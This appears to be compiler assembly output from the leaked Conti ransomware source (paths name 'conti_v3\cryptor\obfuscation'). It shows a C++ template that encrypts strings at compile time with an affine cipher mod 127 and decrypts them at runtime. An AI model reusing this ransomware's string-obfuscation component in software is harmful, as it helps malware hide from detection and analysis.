; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 41	 mov	 BYTE PTR [rcx+1], 65	; 00000041H
  00007	c6 41 02 1f	 mov	 BYTE PTR [rcx+2], 31
  0000b	c6 41 03 00	 mov	 BYTE PTR [rcx+3], 0
  0000f	c6 41 04 1f	 mov	 BYTE PTR [rcx+4], 31
  00013	c6 41 05 78	 mov	 BYTE PTR [rcx+5], 120	; 00000078H
  00017	c6 41 06 1f	 mov	 BYTE PTR [rcx+6], 31
  0001b	c6 41 07 13	 mov	 BYTE PTR [rcx+7], 19
  0001f	c6 41 08 1f	 mov	 BYTE PTR [rcx+8], 31
  00023	c6 41 09 1f	 mov	 BYTE PTR [rcx+9], 31
  00027	c6 41 0a 1f	 mov	 BYTE PTR [rcx+10], 31
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0ED@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$02$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<3,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 10 00 00
	00		 mov	 r10d, 16
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 78 00 00 00	 mov	 eax, 120		; 00000078H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2a	 imul	 ecx, eax, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<3,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$02$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$02$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<3,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<3,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 04	 mov	 BYTE PTR [rcx+1], 4
  00007	c6 41 02 78	 mov	 BYTE PTR [rcx+2], 120	; 00000078H
  0000b	c6 41 03 27	 mov	 BYTE PTR [rcx+3], 39	; 00000027H
  0000f	c6 41 04 78	 mov	 BYTE PTR [rcx+4], 120	; 00000078H
  00013	c6 41 05 21	 mov	 BYTE PTR [rcx+5], 33	; 00000021H
  00017	c6 41 06 78	 mov	 BYTE PTR [rcx+6], 120	; 00000078H
  0001b	c6 41 07 01	 mov	 BYTE PTR [rcx+7], 1
  0001f	c6 41 08 78	 mov	 BYTE PTR [rcx+8], 120	; 00000078H
  00023	c6 41 09 60	 mov	 BYTE PTR [rcx+9], 96	; 00000060H
  00027	c6 41 0a 78	 mov	 BYTE PTR [rcx+10], 120	; 00000078H
  0002b	c6 41 0b 1e	 mov	 BYTE PTR [rcx+11], 30
  0002f	c6 41 0c 78	 mov	 BYTE PTR [rcx+12], 120	; 00000078H
  00033	c6 41 0d 3f	 mov	 BYTE PTR [rcx+13], 63	; 0000003fH
  00037	c6 41 0e 78	 mov	 BYTE PTR [rcx+14], 120	; 00000078H
  0003b	c6 41 0f 78	 mov	 BYTE PTR [rcx+15], 120	; 00000078H
  0003f	c6 41 10 78	 mov	 BYTE PTR [rcx+16], 120	; 00000078H
  00043	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00047	48 8b c1	 mov	 rax, rcx
  0004a	c3		 ret	 0
??0?$MetaBuffer@$02$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<3,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<3,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CJ@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<41,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 10 00 00
	00		 mov	 r11d, 16
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 6f	 sub	 ecx, 111		; 0000006fH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<41,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CJ@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CJ@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<41,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<41,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 5c	 mov	 BYTE PTR [rcx+1], 92	; 0000005cH
  00007	c6 41 02 6f	 mov	 BYTE PTR [rcx+2], 111	; 0000006fH
  0000b	c6 41 03 14	 mov	 BYTE PTR [rcx+3], 20
  0000f	c6 41 04 6f	 mov	 BYTE PTR [rcx+4], 111	; 0000006fH
  00013	c6 41 05 41	 mov	 BYTE PTR [rcx+5], 65	; 00000041H
  00017	c6 41 06 6f	 mov	 BYTE PTR [rcx+6], 111	; 0000006fH
  0001b	c6 41 07 33	 mov	 BYTE PTR [rcx+7], 51	; 00000033H
  0001f	c6 41 08 6f	 mov	 BYTE PTR [rcx+8], 111	; 0000006fH
  00023	c6 41 09 00	 mov	 BYTE PTR [rcx+9], 0
  00027	c6 41 0a 6f	 mov	 BYTE PTR [rcx+10], 111	; 0000006fH
  0002b	c6 41 0b 39	 mov	 BYTE PTR [rcx+11], 57	; 00000039H
  0002f	c6 41 0c 6f	 mov	 BYTE PTR [rcx+12], 111	; 0000006fH
  00033	c6 41 0d 08	 mov	 BYTE PTR [rcx+13], 8
  00037	c6 41 0e 6f	 mov	 BYTE PTR [rcx+14], 111	; 0000006fH
  0003b	c6 41 0f 6f	 mov	 BYTE PTR [rcx+15], 111	; 0000006fH
  0003f	c6 41 10 6f	 mov	 BYTE PTR [rcx+16], 111	; 0000006fH
  00043	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00047	48 8b c1	 mov	 rax, rcx
  0004a	c3		 ret	 0
??0?$MetaBuffer@$0CJ@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<41,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<41,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DF@$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<53,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 6c		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 08 00 00
	00		 mov	 r11d, 8
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 58	 sub	 ecx, 88			; 00000058H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00034	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00038	41 f7 e8	 imul	 r8d
  0003b	41 03 d0	 add	 edx, r8d
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	44 2b c0	 sub	 r8d, eax
  0004e	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00053	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00057	41 f7 e8	 imul	 r8d
  0005a	41 03 d0	 add	 edx, r8d
  0005d	c1 fa 06	 sar	 edx, 6
  00060	8b c2		 mov	 eax, edx
  00062	c1 e8 1f	 shr	 eax, 31
  00065	03 d0		 add	 edx, eax
  00067	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0006a	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0006d	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  00071	49 83 eb 01	 sub	 r11, 1
  00075	75 a9		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00077	49 8b c1	 mov	 rax, r9
  0007a	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<53,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DF@$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DF@$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<53,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<53,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 71	 mov	 BYTE PTR [rcx+1], 113	; 00000071H
  00007	c6 41 02 58	 mov	 BYTE PTR [rcx+2], 88	; 00000058H
  0000b	c6 41 03 36	 mov	 BYTE PTR [rcx+3], 54	; 00000036H
  0000f	c6 41 04 58	 mov	 BYTE PTR [rcx+4], 88	; 00000058H
  00013	c6 41 05 4b	 mov	 BYTE PTR [rcx+5], 75	; 0000004bH
  00017	c6 41 06 58	 mov	 BYTE PTR [rcx+6], 88	; 00000058H
  0001b	c6 41 07 58	 mov	 BYTE PTR [rcx+7], 88	; 00000058H
  0001f	c6 41 08 58	 mov	 BYTE PTR [rcx+8], 88	; 00000058H
  00023	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00027	48 8b c1	 mov	 rax, rcx
  0002a	c3		 ret	 0
??0?$MetaBuffer@$0DF@$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<53,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<53,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DL@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DL@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<59,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 14 00 00
	00		 mov	 r11d, 20
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 09	 sub	 ecx, 9

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1c	 imul	 r8d, ecx, 28

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DL@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<59,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DL@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DL@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<59,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::MetaBuffer<59,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 38	 mov	 BYTE PTR [rcx+1], 56	; 00000038H
  00007	c6 41 02 09	 mov	 BYTE PTR [rcx+2], 9
  0000b	c6 41 03 43	 mov	 BYTE PTR [rcx+3], 67	; 00000043H
  0000f	c6 41 04 09	 mov	 BYTE PTR [rcx+4], 9
  00013	c6 41 05 11	 mov	 BYTE PTR [rcx+5], 17
  00017	c6 41 06 09	 mov	 BYTE PTR [rcx+6], 9
  0001b	c6 41 07 3f	 mov	 BYTE PTR [rcx+7], 63	; 0000003fH
  0001f	c6 41 08 09	 mov	 BYTE PTR [rcx+8], 9
  00023	c6 41 09 08	 mov	 BYTE PTR [rcx+9], 8
  00027	c6 41 0a 09	 mov	 BYTE PTR [rcx+10], 9
  0002b	c6 41 0b 31	 mov	 BYTE PTR [rcx+11], 49	; 00000031H
  0002f	c6 41 0c 09	 mov	 BYTE PTR [rcx+12], 9
  00033	c6 41 0d 7e	 mov	 BYTE PTR [rcx+13], 126	; 0000007eH
  00037	c6 41 0e 09	 mov	 BYTE PTR [rcx+14], 9
